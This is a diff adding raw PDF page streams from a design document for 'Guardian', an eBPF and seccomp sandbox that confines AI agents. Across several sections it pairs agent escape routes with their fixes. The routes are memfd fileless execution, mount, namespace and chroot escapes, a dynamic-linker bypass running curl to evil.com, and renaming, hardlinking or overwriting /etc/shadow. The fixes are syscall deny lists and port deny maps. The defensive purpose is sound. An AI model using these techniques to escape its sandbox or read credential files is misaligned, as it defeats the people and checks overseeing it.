+(filesystem. An agent can write a malicious binary into this memory file, then execute it) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 505 Tm
+(with execveat\(\) using the AT_EMPTY_PATH flag:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 480 Tm
+(# Pseudocode of the attack:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 468 Tm
+(fd = memfd_create\("innocent", 0\)       # Create anonymous memory file) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 456 Tm
+(write\(fd, malicious_binary_content\)    # Write executable code into it) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 444 Tm
+(execveat\(fd, "", argv, envp, AT_EMPTY_PATH\)  # Execute directly from fd) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 420 Tm
+(# What Guardian sees for the exec:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 408 Tm
+(#   Path: "/memfd:innocent" or empty string) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 396 Tm
+(#   This path doesn't match any deny rules!) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 384 Tm
+(#   The binary never existed on disk ? nothing to scan) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 364 Tm
+(The fix: Block memfd_create via seccomp + deny /memfd: paths) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 339 Tm
+(// Seccomp blocks the syscall entirely:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 327 Tm
+(const SYS_MEMFD_CREATE: i64 = 319;) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 315 Tm
+(// Agent gets EPERM ? cannot create memory-only files at all) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 291 Tm
+(// Additionally, exec policy has default deny for /memfd: paths) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 279 Tm
+(// as a defense-in-depth measure) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 259 Tm
+(7.4 Mount and Namespace Escape) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 236 Tm
+(An agent could try to escape its sandbox by manipulating mount points or entering) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 221 Tm
+(different namespaces:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 196 Tm
+(# Mount attack: overlay a different filesystem on top of a denied directory) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 184 Tm
+(mount -t overlay overlay -o lowerdir=/etc,upperdir=/tmp/evil /etc) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 172 Tm
+(# Now /etc/shadow reads from /tmp/evil/shadow \(agent-controlled!\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 148 Tm
+(# Namespace escape: enter the host namespace from a container) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 136 Tm
+(setns\(fd, CLONE_NEWNS\)   # Escape mount namespace) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 124 Tm
+(unshare\(CLONE_NEWNS\)     # Create new mount namespace) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 100 Tm
+(# Chroot escape:) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 18 of 40) Tj
+ET
+endstream
+endobj
+22 0 obj
+<< /Length 3455 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(chroot\("/tmp/fakejail"\)  # Create a fake root) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(pivot_root\(".", "old"\)   # Pivot to it) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 700 Tm
+(The fix: Block all mount-related and namespace syscalls) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 675 Tm
+(// Phase 10 hardened seccomp blocks all of these:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 663 Tm
+(155,  // pivot_root ? root filesystem manipulation) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 651 Tm
+(161,  // chroot ? change root directory) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 639 Tm
+(165,  // mount ? traditional mount syscall) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 627 Tm
+(166,  // umount2 ? unmount filesystems) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 615 Tm
+(272,  // unshare ? create new namespaces) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 603 Tm
+(308,  // setns ? enter existing namespace) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 591 Tm
+(428,  // open_tree ? new mount API) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 579 Tm
+(429,  // move_mount ? new mount API) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 567 Tm
+(430,  // fsopen ? new mount API) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 555 Tm
+(431,  // fsconfig ? new mount API) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 543 Tm
+(432,  // fsmount ? new mount API) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 531 Tm
+(433,  // fspick ? new mount API) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 519 Tm
+(442,  // mount_setattr ? new mount API) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 499 Tm
+(7.5 The Complete Seccomp Filter) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 476 Tm
+(Guardian applies seccomp in two tiers:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 451 Tm
+(Base filter \(always applied\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 439 Tm
+(  ?? io_uring_setup \(425\)     ? Blocks invisible I/O) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 427 Tm
+(  ?? io_uring_enter \(426\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 415 Tm
+(  ?? io_uring_register \(427\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 403 Tm
+(  ?? memfd_create \(319\)       ? Blocks fileless execution) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 379 Tm
+(Hardened filter \(Phase 10, cgroup agents\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 367 Tm
+(  All of the above, PLUS:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 355 Tm
+(  ?? pivot_root \(155\)         ? Blocks root escape) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 343 Tm
+(  ?? chroot \(161\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 331 Tm
+(  ?? mount \(165\)              ? Blocks mount manipulation) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 319 Tm
+(  ?? umount2 \(166\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 307 Tm
+(  ?? unshare \(272\)            ? Blocks namespace escape) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 295 Tm
+(  ?? setns \(308\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 283 Tm
+(  ?? open_tree \(428\)          ? Blocks new mount API) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 271 Tm
+(  ?? move_mount \(429\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 259 Tm
+(  ?? fsopen \(430\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 247 Tm
+(  ?? fsconfig \(431\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 235 Tm
+(  ?? fsmount \(432\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 223 Tm
+(  ?? fspick \(433\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 211 Tm
+(  ?? mount_setattr \(442\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 185 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 167 Tm
+(8. Dynamic Linker Detection) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 139 Tm
+(8.1 The ld-linux Bypass) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 116 Tm
+(The dynamic linker \(ld-linux.so\) is the program that loads shared libraries. It can also) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 101 Tm
+(be used directly to execute any binary:) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 19 of 40) Tj
+ET
+endstream
+endobj
+23 0 obj
+<< /Length 3490 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 722 Tm
+(# Normal execution \(Guardian can check and block\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 710 Tm
+(/usr/bin/curl https://evil.com) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 698 Tm
+(# ? execve\("/usr/bin/curl"\) ? Guardian checks exec policy ? DENIED) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 674 Tm
+(# Dynamic linker bypass:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 662 Tm
+(/lib64/ld-linux-x86-64.so.2 /usr/bin/curl https://evil.com) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 650 Tm
+(# ? execve\("/lib64/ld-linux-x86-64.so.2"\) ? Guardian checks exec policy) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 638 Tm
+(# ? /lib64/ld-linux-x86-64.so.2 is not in deny list ? ALLOWED) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 626 Tm
+(# ? ld-linux loads and runs /usr/bin/curl ? curl runs!) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 606 Tm
+(The exec policy only sees the linker path, not the actual binary being loaded.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 581 Tm
+(8.2 How Guardian Detects It) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 558 Tm
+(Guardian maintains a map of known dynamic linker paths:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 533 Tm
+(// In guardian-ebpf/src/main.rs) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 521 Tm
+(#[map]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 509 Tm
+(static DYNAMIC_LINKERS: HashMap<[u8; 256], u8> = HashMap::with_max_entries\(16, 0\);) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 485 Tm
+(// Populated at startup by userspace daemon with:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 473 Tm
+("/lib64/ld-linux-x86-64.so.2") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 461 Tm
+("/lib/ld-linux.so.2") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 449 Tm
+("/lib/ld-linux-aarch64.so.1") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 437 Tm
+("/usr/lib64/ld-linux-x86-64.so.2") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 425 Tm
+("/usr/lib/ld-linux.so.2") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 413 Tm
+("/lib/ld-musl-x86_64.so.1") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 401 Tm
+("/lib/ld-musl-aarch64.so.1") Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 381 Tm
+(8.3 Reading argv[1] in eBPF) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 358 Tm
+(When the tracepoint detects a dynamic linker execution, it reads argv[1] to find the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 343 Tm
+(real binary:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 318 Tm
+(sys_enter_execve tracepoint:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 306 Tm
+(  1. Read filename \(arg at offset +24\): "/lib64/ld-linux-x86-64.so.2") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 294 Tm
+(  2. Check DYNAMIC_LINKERS map: MATCH ? this is a linker!) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 282 Tm
+(  3. Read argv pointer \(offset +24 for argv array\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 270 Tm
+(  4. Read argv[1] \(second element of argv array\): "/usr/bin/curl") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 258 Tm
+(  5. Evaluate exec policy against "/usr/bin/curl" \(the REAL binary\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 246 Tm
+(  6. /usr/bin/curl is denied ? set PENDING_EXEC_DENY) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 234 Tm
+(  7. bprm_check_security LSM ? blocks execution) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 214 Tm
+(Attack: /lib64/ld-linux-x86-64.so.2 /usr/bin/curl evil.com) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 190 Tm
+(BEFORE fix:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 178 Tm
+(  bprm sees: ld-linux-x86-64.so.2 ? not in deny list ? ALLOWED) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 166 Tm
+(  curl runs and exfiltrates data ? SECURITY BREACH) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 142 Tm
+(AFTER fix:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 130 Tm
+(  bprm sees: ld-linux-x86-64.so.2 ? known linker!) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 118 Tm
+(  Read argv[1]: /usr/bin/curl ? check exec policy ? DENIED) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 106 Tm
+(  Return -EPERM ? ATTACK BLOCKED) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 20 of 40) Tj
+ET
+endstream
+endobj
+24 0 obj
+<< /Length 3402 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 714 Tm
+(9. Inode Hooks: Rename, Unlink, and Hardlink Protection) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 686 Tm
+(9.1 The Rename Attack) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 663 Tm
+(An agent can rename files to move them across security boundaries:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 638 Tm
+(# Scenario: /etc/shadow is denied, /tmp/** is allowed) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 614 Tm
+(# Attack 1: Move denied file into allowed directory) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 602 Tm
+(mv /etc/shadow /tmp/shadow-copy) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 590 Tm
+(cat /tmp/shadow-copy  # Now it's in an allowed path!) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 566 Tm
+(# Attack 2: Move allowed file into denied file's location) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 554 Tm
+(echo "root::0:0:::" > /tmp/fake-shadow) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 542 Tm
+(mv /tmp/fake-shadow /etc/shadow  # Replace the real shadow file!) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 522 Tm
+(Guardian's fix: The sys_enter_renameat2 tracepoint + inode_rename LSM hook checks both) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 507 Tm
+(the source and destination paths:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 482 Tm
+(rename\("/etc/shadow", "/tmp/shadow-copy"\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 470 Tm
+(  Tracepoint checks:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 458 Tm
+(    Source "/etc/shadow" ? denied ? PENDING_RENAME_DENY = 1) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 446 Tm
+(  LSM inode_rename:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 434 Tm
+(    PENDING_RENAME_DENY exists ? return -EACCES) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 422 Tm
+(  Result: rename blocked) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 398 Tm
+(rename\("/tmp/fake", "/etc/shadow"\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 386 Tm
+(  Tracepoint checks:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 374 Tm
+(    Destination "/etc/shadow" ? denied ? PENDING_RENAME_DENY = 1) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 362 Tm
+(  LSM inode_rename:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 350 Tm
+(    PENDING_RENAME_DENY exists ? return -EACCES) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 338 Tm
+(  Result: rename blocked) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 318 Tm
+(9.2 The Hardlink Attack) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 295 Tm
+(Hardlinks create a second name for the same inode. Unlike symlinks, hardlinks are) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 280 Tm
+(indistinguishable from the original file:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 255 Tm
+(# Attack: create a hardlink to /etc/shadow in an allowed directory) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 243 Tm
+(ln /etc/shadow /tmp/shadow-hardlink) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 219 Tm
+(# /tmp/shadow-hardlink IS /etc/shadow \(same inode, same content\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 207 Tm
+(# Modifying one modifies the other) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 195 Tm
+(# And /tmp/shadow-hardlink is in the allowed /tmp/** path!) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 175 Tm
+(Guardian's fix: The inode_link LSM hook blocks hardlink creation when the source is a) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 160 Tm
+(denied file:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 135 Tm
+(link\("/etc/shadow", "/tmp/shadow-hardlink"\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 123 Tm
+(  Tracepoint: source is /etc/shadow ? denied ? PENDING_LINK_DENY = 1) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 111 Tm
+(  LSM inode_link: PENDING_LINK_DENY exists ? return -EACCES) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 99 Tm
+(  Result: hardlink creation blocked) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 21 of 40) Tj
+ET
+endstream
+endobj
+25 0 obj
+<< /Length 3594 >>
+stream
+BT
+/F2 13 Tf
+1 0 0 1 54 732 Tm
+(9.3 How Guardian Blocks Both) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 709 Tm
+(Each operation has its own tracepoint ? PENDING map ? LSM hook chain:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(?????????????????????????????????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(? Operation         ? Tracepoint           ? LSM Hook + Map        ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(?????????????????????????????????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(? rename\(src, dst\) ? sys_enter_renameat2  ? inode_rename +         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 636 Tm
+(?                  ? Checks BOTH paths    ? PENDING_RENAME_DENY    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 624 Tm
+(?????????????????????????????????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 612 Tm
+(? unlink\(path\)     ? sys_enter_unlinkat   ? inode_unlink +         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 600 Tm
+(?                  ? Checks target path   ? PENDING_UNLINK_DENY    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 588 Tm
+(?????????????????????????????????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 576 Tm
+(? link\(src, dst\)   ? sys_enter_linkat     ? inode_link +           ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 564 Tm
+(?                  ? Checks source path   ? PENDING_LINK_DENY      ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 552 Tm
+(?????????????????????????????????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 526 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 508 Tm
+(10. Network Enforcement) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 480 Tm
+(10.1 The sys_enter_connect Tracepoint) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 457 Tm
+(When a process calls connect\(\) to establish a network connection, Guardian's tracepoint) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 442 Tm
+(parses the socket address to extract the destination IP and port:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 417 Tm
+(connect\(fd, sockaddr, addrlen\) syscall entry:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 405 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 393 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 381 Tm
+(sys_enter_connect tracepoint:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 369 Tm
+(  1. Read sockaddr* from syscall arg at offset +24) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 357 Tm
+(  2. Read sa_family \(first 2 bytes\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 345 Tm
+(     - AF_INET \(2\) = IPv4) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 333 Tm
+(     - AF_INET6 \(10\) = IPv6) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 321 Tm
+(     - Anything else = skip) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 297 Tm
+(  For AF_INET:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 285 Tm
+(  3. Read port from offset +2 \(2 bytes, network byte order ? host byte order\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 273 Tm
+(  4. Read IPv4 addr from offset +4 \(4 bytes\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 249 Tm
+(  For AF_INET6:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 237 Tm
+(  3. Read port from offset +2) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 225 Tm
+(  4. Read IPv6 addr from offset +8 \(16 bytes\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 201 Tm
+(  5. Evaluate network policy against dest port) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 189 Tm
+(  6. If denied: set PENDING_NET_DENY) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 177 Tm
+(  7. Output NetworkEvent to userspace) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 157 Tm
+(10.2 Port-Based Policy Maps) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 134 Tm
+(Network policy is evaluated using port-based maps:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 109 Tm
+(NET_DENY_PORTS map:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 97 Tm
+(  22 ? 1    \(SSH denied\)) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 22 of 40) Tj
+ET
+endstream
+endobj
+26 0 obj
+<< /Length 3500 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(  25 ? 1    \(SMTP denied\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(  3306 ? 1  \(MySQL denied\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(NET_ALLOW_PORTS map:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(  80 ? 1    \(HTTP allowed\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(  443 ? 1   \(HTTPS allowed\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(NET_CGROUP_DEFAULT_ACTION map:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 636 Tm
+(  cgroup_id_12345 ? 0   \(default deny for this agent's cgroup\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 612 Tm
+(Policy evaluation:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 600 Tm
+(  1. Is port in NET_DENY_PORTS? ? DENY \(deny takes precedence\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 588 Tm
+(  2. Is port in NET_ALLOW_PORTS? ? ALLOW) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 576 Tm
+(  3. Check NET_CGROUP_DEFAULT_ACTION for this cgroup) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 564 Tm
+(  4. Check NET_DEFAULT_ACTION for this comm) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 552 Tm
+(  5. Fail-open if no policy configured) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 532 Tm
+(10.3 LSM socket_connect ? Kernel-Level Blocking) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 509 Tm
+(connect\(fd, {AF_INET, port=22, ip=192.168.1.100}, ...\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 497 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 485 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 473 Tm
+(Tracepoint: port 22 in NET_DENY_PORTS ? PENDING_NET_DENY[pid] = 1) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 461 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 449 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 437 Tm
+(LSM socket_connect: PENDING_NET_DENY[pid] exists) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 425 Tm
+(  ? remove entry) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 413 Tm
+(  ? return -111 \(ECONNREFUSED\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 401 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 389 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 377 Tm
+(Agent sees: "Connection refused") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 357 Tm
+(The -ECONNREFUSED error code is chosen deliberately ? it looks identical to a server) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 342 Tm
+(being down, giving the agent no indication that it is being blocked by Guardian.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 317 Tm
+(10.4 DNS Monitoring via Port 53) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 294 Tm
+(DNS queries happen before connect\(\). When an agent resolves evil.com, the DNS response) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 279 Tm
+(provides the IP address, and then the agent connects to that IP. Guardian monitors DNS) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 264 Tm
+(by watching traffic to port 53:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 239 Tm
+(Agent: curl https://evil.com) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 227 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 215 Tm
+(Step 1:  sendto\(dns_socket, "query evil.com", port 53\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 203 Tm
+(         ?? Guardian tracepoint: port 53 detected!) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 191 Tm
+(            Read DNS query payload ? extract domain name ? log) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 179 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 167 Tm
+(Step 2:  DNS response: evil.com = 93.184.216.34) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 155 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 143 Tm
